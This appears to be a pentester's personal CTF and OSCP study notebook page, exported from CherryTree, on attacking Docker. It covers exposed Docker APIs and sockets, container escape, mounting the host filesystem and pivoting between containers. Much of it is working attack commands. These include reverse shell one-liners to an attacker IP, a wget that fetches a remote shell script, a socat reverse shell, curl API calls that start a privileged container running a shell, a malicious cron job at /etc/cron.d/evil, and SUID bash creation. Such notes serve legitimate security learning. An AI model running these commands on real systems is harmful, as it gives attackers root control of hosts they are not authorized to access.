<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Docker</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Docker</h1><br/><p><a name="Docker API"></a><h1>Docker API / Daemon</h1></p><p>[CTF D 59-54, CTF...]</p><p></p><p>Def ports are either <strong>2375</strong> or <strong>2376</strong>. This shouldn&#39;t be publically accessible, &amp; it may allow for Enumeration or RCE. See <a href="https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker">Hackricks</a>.</p><p></p><p>If it&#39;s not externally accessible but you have local access, you can setup a Port Forward.</p><p></p><p><h2>RCE Method 1</h2></p><p>You can connect to an exposed Docker API from your machine by using <strong>docker</strong> &amp; specifying the Host with <strong>-H</strong>.</p><p></p><p><h3>List Images</h3></p><p>Determine which images are installed on the target system. You&#39;ll use 1 of them in the next step.</p><p></p><p><em>docker -H IP:2375 images</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Example Output</span></p><p><strong>Repo							TAG...</strong><strong></strong></p><p><strong>alpine						3.9</strong></p><p></p><p><h3>Shell</h3></p><p>This is just like the <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> PrivEsc method, except you&#39;re doing it to a remote host.</p><p></p><p><em>docker -H IP:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh</em></p><p></p><p><h2>RCE Method 2</h2></p><p>Unlike the previous method, you list containers &amp; use a running container to execute commands.</p><p></p><p>The socket was exposed at port 8080, &amp; I had SSH access, so I setup a port forward to access it remotely.</p><p></p><p><em>ssh -L 8080:localhost:8080 bob@10.10.65.6 -N -f</em></p><p></p><p><h3>List Containers</h3></p><p><em>docker -H tcp://localhost:8080 container ls</em></p><p></p><p><h3>Payload</h3></p><p>Run a reverse shell 1-liner. If the target has restrictions (e.g. tools missing) you can also upload a Reverse Shell script to the target &amp; then execute it.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Reverse Shell 1-liner</span></p><p></p><p><em>docker -H tcp://localhost:8080 container exec sweettoothinc bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.6.51.30/4444 0&gt;&amp;1&#39;</em><em></em></p><p><em></em><em></em></p><p><em>docker -H tcp://localhost:8080 container exec sweettoothinc sh -c &#39;exec 5&lt;&gt;/dev/tcp/10.6.51.30/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Upload Payload</span>: Since the Docker Daemon is running as root, you&#39;ll get root level access inside the container.</p><p></p><p><em>docker -H tcp://localhost:8080 container exec sweettoothinc wget http://10.6.51.30/docker_shell.sh</em></p><p></p><p><em>docker -H tcp://localhost:8080 container exec sweettoothinc bash -i docker_shell.sh</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Upload Tools</span>: If the target is connected to the internet, you can install the dependencies you need for your payload. For example, <strong>apk add</strong> is the Alpine Linux (Very common container) equivilant to <strong>apt install</strong> on Debian.</p><p></p><p><em>docker -H unix:///var/run/docker.sock run -d --rm alpine sh -c &quot;apk add --no-cache bash socat &amp;&amp; socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT&quot;</em></p><p></p><p><a name="API curl RCE"></a><h2>RCE Method3</h2></p><p>See <a href="https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25">Github</a>. This method <span style="color:#ff0000;">didn&#39;t work</span> for me (may work in other cases though).</p><p></p><p>The command is executed when the container is started</p><p></p><p><h3>List Images</h3></p><p><em>curl -s --unix-socket /var/run/docker.sock http://localhost/images/json</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Alternate</span>: For example, if traffic is forwarded to <strong>docker.sock</strong> using the following command, you can access it even if your version of curl doesn&#39;t support the<strong> --unix-socket</strong> argument.</p><p></p><p><strong>socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock</strong></p><p></p><p><em>curl localhost:8080/images/json</em></p><p></p><p><em>curl localhost:8080/containers/json</em></p><p></p><p><h3>RCE</h3></p><p>For example, the host has the <strong>sandbox:latest</strong> image.</p><p></p><p><em>cmd=&quot;[\&quot;/bin/sh\&quot;,\&quot;-c\&quot;,\&quot;chroot /tmp sh -c \\\&quot;bash -c &#39;bash -i &amp;&gt;/dev/tcp/10.10.14.30/12348 0&lt;&amp;1&#39;\\\&quot;\&quot;]&quot;</em></p><p></p><p><em>curl -s -X POST --unix-socket /var/run/docker.sock -d &quot;{\&quot;Image\&quot;:\&quot;sandbox\&quot;,\&quot;cmd\&quot;:$cmd,\&quot;Binds\&quot;:[\&quot;/:/tmp:rw\&quot;]}&quot; -H &#39;Content-Type: application/json&#39; http://localhost/containers/create?name=peterpwn_root</em></p><p></p><p><em>curl -s -X POST --unix-socket /var/run/docker.sock &quot;http://localhost/containers/peterpwn_root/start&quot;</em></p><p></p><p><h1>Unconventional Container Escape</h1></p><p>[PrivEsc 5]</p><p></p><p>Typically, escaping a container requires a misconfig, outdated SW, or another mistake.</p><p></p><p>Even if the container itself is setup properly, you may be able to break out due to a mistake made on the host itself (outside the container), without attacking the container itself! Ignore your problems until they go away on their own!</p><p></p><p><h2>Cron Jobs &amp; Systemd Services</h2></p><p>If the host has a job thats scheduled to run a script you can access from within the container, then you may be able to escape by modifying that script (i.e trigger reverse shell from host itself). Just like using Cron for normal <a href="PrivEsc_8.html">PrivEsc</a>.</p><p></p><p><h2>SSH / Remote Logins</h2></p><p>The host itself may be running something like SSH, &amp; there may be creds for it that you can find from within the container (e.g Credential Re-use).</p><p></p><p><h1>Docker</h1></p><p>[PrivEsc 5-6]</p><p></p><p><h2>Configuration Files</h2></p><p><strong>/entrypoint.sh</strong> or <strong>/initializeandquery.sh</strong> may contain info like hard-coded creds &amp; references to other hosts (e.g. SQL connection info).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The creds may not be accurate. Check other places for creds like <span style="color:#ff0000;">Environment Variables</span>.</p><p></p><p><h2>Host File System R/W</h2></p><p>If host drive/directory is mounted in container, may be able to R/W from inside the container.</p><p></p><p>Could also have perms to mount host FS inside container yourself.</p><p></p><p>You can leverage R/W permissions over <strong><a href="PrivEsc--Escapes--Docker_58.html#Docker Socket">docker.socket</a></strong>, or access to a UNIX Socket that connects to it, for local or remote exploitation. </p><p></p><p><h3>Listing Mount Points</h3></p><p>[OSCP 157]</p><p></p><p>For some reason, some of these methods don&#39;t always work, even if they&#39;re run as root inside the container.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If a user in the Container (i.e. root) can R/W to the Host FS, sometimes those <a href="PrivEsc--Escapes--Docker_58.html#exploiting perms">file permissions</a> carry over. Ergo, you <span style="color:#ff0000;">may be able to create a root binary on the Host</span> OS!</p><p></p><p><em><span style="color:#8ff0a4;text-decoration:underline;">mount</span></em>: Most reliable method. Shows all mounted drives, even if they weren&#39;t mounted vita fstab.</p><p></p><p><em><span style="color:#8ff0a4;text-decoration:underline;">lsblk</span></em>: Sometimes works, less reliable than mount. In this example you can mount <strong>/dev/xvda1</strong> to access<strong> </strong>the host&#39;s entire File System<strong> </strong>( <strong>/</strong> ).</p><p></p><p><strong>NAME    	MAJ:MIN 		RM  		SIZE		 RO 	TYPE 		MOUNTPOINT</strong><strong></strong></p><p><strong>xvda    		202:0    			0   			16G  		0 		disk </strong><strong></strong></p><p><strong>|-</strong><strong><span style="color:#ff0000;">xvda1</span></strong><strong> 	202:1    				0 			15.3G  	0 		part 			/var/lib/influxdb</strong></p><p></p><p><strong><span style="color:#8ff0a4;text-decoration:underline;">/etc/fstab</span></strong>: May not show all drives, but could reveal additional info about drives it lists.</p><p></p><p><span style="color:#cdab8f;">★</span><em><span style="color:#8ff0a4;text-decoration:underline;">fdisk -l</span></em>: Lists partition tables, which may reveal unmounted drives which you may be able to mount somewhere. Typically requires elevated privs to use. Mount the entry that has a <strong>*</strong> in the <strong>Boot</strong> column.</p><p></p><p><strong>Device     			Boot 		   Start      End 						 Sectors 			 Size 			Id 			Type</strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff0000;">/dev/xvda1</span></strong><strong>		 </strong><strong><span style="color:#ff0000;">*</span></strong><strong>        			2048 	32088063 		32086016 		15.3G 		83			 Linux</strong></p><p></p><p><span style="color:#cdab8f;">★</span><em><span style="color:#8ff0a4;text-decoration:underline;">df -h</span></em>: Look for block devices (e.g. <strong>/dev/xvda1</strong>) under <strong>Filesystem</strong>. You can ignore the <strong>Mounted on</strong> column.</p><p></p><p><strong>Filesystem      Size 			 Used 		Avail			 Use% 			Mounted on</strong><strong></strong></p><p><strong>none             		15G  			4.8G 			9.5G  		34% 			/</strong><strong></strong></p><p><strong>tmpfs           	 	64M     		0   				64M   		0%					/dev</strong><strong></strong></p><p><strong>tmpfs           		247M     	0  				247M   		0% 					/sys/fs/cgroup</strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff0000;">/dev/xvda1</span></strong><strong>     15G  			4.8G  		9.5G 		 	34% 				/etc/hosts</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">linpeas</span>: Output is in a different format than other methods. In the following example, the Container&#39;s <strong>/data</strong> is mounted on (identical to) the Host&#39;s <strong>/gitea</strong>.</p><p></p><p><strong>/gitea /data rw, realtime - ext4 /dev/xvda1...</strong></p><p></p><p><em>mount | grep data</em></p><p></p><p><strong>/dev/xvda1 on /data...</strong></p><p></p><p><h3>Mounting Host&#39;s File System</h3></p><p>Mount the host&#39;s FS to get full R/W access. You can then get RCE on the host by <a href="PrivEsc--Linux--Post-Exploit_47.html#Create a Cron Job">Creating a Cron Job</a>, setting up root SSH, <a href="PrivEsc--Linux_29.html#Writable /etc/passwd">editing </a><strong><a href="PrivEsc--Linux_29.html#Writable /etc/passwd">/etc/passwd</a></strong>, etc.</p><p></p><p>In the aforementioned examples for <strong>lsblk</strong>, <strong>fdisk -l</strong>, and <strong>df -h</strong>, you can mount <strong>/dev/xvda1</strong> to access the host&#39;s entire FS ( <strong>/</strong> ). Those examples all came from the same machine &amp; are just displayed differently.</p><p></p><p><em>mount /dev/xvda1 /mnt</em></p><p></p><p><em>cat &lt;&lt; EOF &gt; /mnt/etc/cron.d/evil</em></p><p></p><p><strong>SHELL=/bin/bash</strong><strong></strong></p><p><strong>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</strong><strong></strong></p><p><strong>* * * * * root bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.6.51.30/9999 0&gt;&amp;1&#39;</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Requirements</span><ol><li>The host&#39;s FS is accessible inside the container</li></ol></p><p><ol><li>You have permission to <strong>mount</strong> (root user, <strong>sudo</strong> permission, or SUID / SGID on <strong>mount</strong>)</li></ol></p><p></p><p><a name="exploiting perms"></a><h3>Exploiting File Permissions</h3></p><p>[CTF B 185]</p><p></p><p>IDK if this behavior is normal, or due to some Docker / Host Config, but I was able to modify file permissions as root in the Container &amp; that translated to root on the Host OS.</p><p></p><p>However, I was unable to copy /bin/bash &amp; give it SUID bash from inside the Container, despite being able to <strong>touch</strong> files as root in the Container. For example, running the following in the Container got the following error.</p><p></p><p><em>cp /bin/bash /data/bash; chmod u+s /data/bash</em></p><p></p><p><strong>-bash: /gitea/bash No such file</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Workaround</span>: Creating a Reverse Shell payload as root in the Container also failed. Instead, copy the binary using a user with R/W access to target directory on the Host OS.</p><p></p><p><strong>{Host}</strong> <em>cd /gitea/gitea; cp /bin/bash .</em></p><p></p><p><strong>{Container}</strong> <em>cd /data/gitea; chown root:root ./bash &amp;&amp; chmod u+s ./bash</em></p><p></p><p><strong>{Host}</strong> <em>./bash -p</em></p><p></p><p><h3>Hijacking PrivEsc &amp; Escape</h3></p><p>For ex, if you can access file that host will execute (e.g Cron, Service, SNMP, etc) &amp; you can trigger file execution (or wait for scheduled exection), you can write a R Shell payload to escape &amp; possibly PrivEsc.</p><p></p><p><a name="Docker Socket"></a><h2>Docker Socket</h2></p><p>[CTF D 53-54]</p><p></p><p><strong>/var/run/docker.sock</strong> or <strong>/run/docker.sock</strong> is a UNIX socket used to control the Docker daemon (like Docker CLI or the Docker API).</p><p></p><p>Anyone with R/W access to it, or a UNIX Socket connected to it, has full root access to the Docker host.</p><p></p><p><h3>Requirements</h3></p><p>You need at least 1 of the following:</p><p><ol><li>R/W permissions over <strong>docker.socket</strong></li></ol></p><p><ol><li>Access to a UNIX Socket that connects to <strong>docker.socket</strong> (e.g. setup with <strong>socat</strong> or <strong>ncat</strong>).</li></ol></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The ability to access a UNIX Socket is effectively like having R/W over <strong>docker.socket</strong>, because tools like <strong>socat</strong> open the file in R/W mode. If you only had R/ permissions, <strong>socat</strong> wouldn’t be able to pass data back from the TCP client to the Docker Daemon.</p><p></p><p><h3>Control Over docker.socket</h3></p><p>There are 2 attack paths: Remote &amp; Local.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Remote</span>: You&#39;re effectively granting yourself access to the <a href="PrivEsc--Escapes--Docker_58.html#Docker API">Docker API</a> by exposing the Docker Daemon to an externally accessible port.</p><p></p><p><em>socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Local</span>: There are multiple methods for interacting with the Docker Daemon</p><p><ol><li><strong>docker</strong> client tool</li></ol></p><p><ol><li><strong>curl --unix-socket</strong> (not all versions of Curl support this argument). See <a href="PrivEsc--Escapes--Docker_58.html#API curl RCE">RCE Method 3</a>.</li></ol></p><p><ol><li>Use the Remote exploitation method to interact with the socket, without needing Curl&#39;s <strong>--unix-socket</strong> argument.</li></ol></p><p></p><p><h1>Pivot Containers</h1></p><p>Hosts often run multiple containers for different purposes (e.g. a Web App &amp; a Database) for compartmentalization.</p><p></p><p>Some of these containers may not be externally excessible, but one container can often route to others.</p><p></p><p><h2>Host Enumeration</h2></p><p><strong>ENV variables</strong>: Check for other containers / hosts that are referenced.</p><p></p><p><strong>Configuration Files</strong>: Files like <strong>/entrypoint.sh</strong> may contain references to other hosts &amp; even credentials. There could also be less common config files like <strong>/initializeandquery.sh</strong></p><p></p><p><strong>/etc/hosts</strong>: Check files like this for routing info.</p><p></p><p><strong>Routing Tables</strong>:<em> ip r get 1</em></p><p></p><p><strong>ARP</strong>: Could you use <em>arp -a</em> ?</p><p></p><p><strong>Scans</strong>: Use Nmap scan or basic Ping Sweep (e.g. using netcat). Maybe setup a Proxy or PF on 1 container so you can reach the others from your machine.</p><p></p><p><h3>Scans</h3></p><p>If Nmap isn&#39;t installed, you can upload a <a href="https://github.com/opsec-infosec/nmap-static-binaries">static binary</a> (this was having an issue using NSE &amp; things like SVC Detection, but they aren&#39;t needed). You could also use certain pivoting methods which won&#39;t interfere with the scans.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Ping Sweep</span>: Identify other hosts &amp; containers in the network. Use a command like <strong>ip -c a</strong> to see your host&#39;s Docker interface &amp; use it for the target syntax (incl CIDR Notation) for the Nmap command.</p><p></p><p><em>./nmap -v 172.17.0.0/24 -sn</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: <strong>/24</strong> CIDR is 0-255 for the last octect, &amp; it&#39;s a good place to start. You may also need to use <strong>/16</strong> to check the last 2 octets, but that&#39;ll be much slower.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Port Scan</span>: For example, the following command will scan 2 containers detected by the Ping Sweep.</p><p></p><p><em>./nmap -p- -v -T4 172.17.0.1-2</em></p><p></p><p><h1>Docker PrivEsc</h1></p><p>See <a href="PrivEsc--Linux_29.html#docker PrivEsc">Docker PrivEsc</a> </p></div>
</body>
</html>
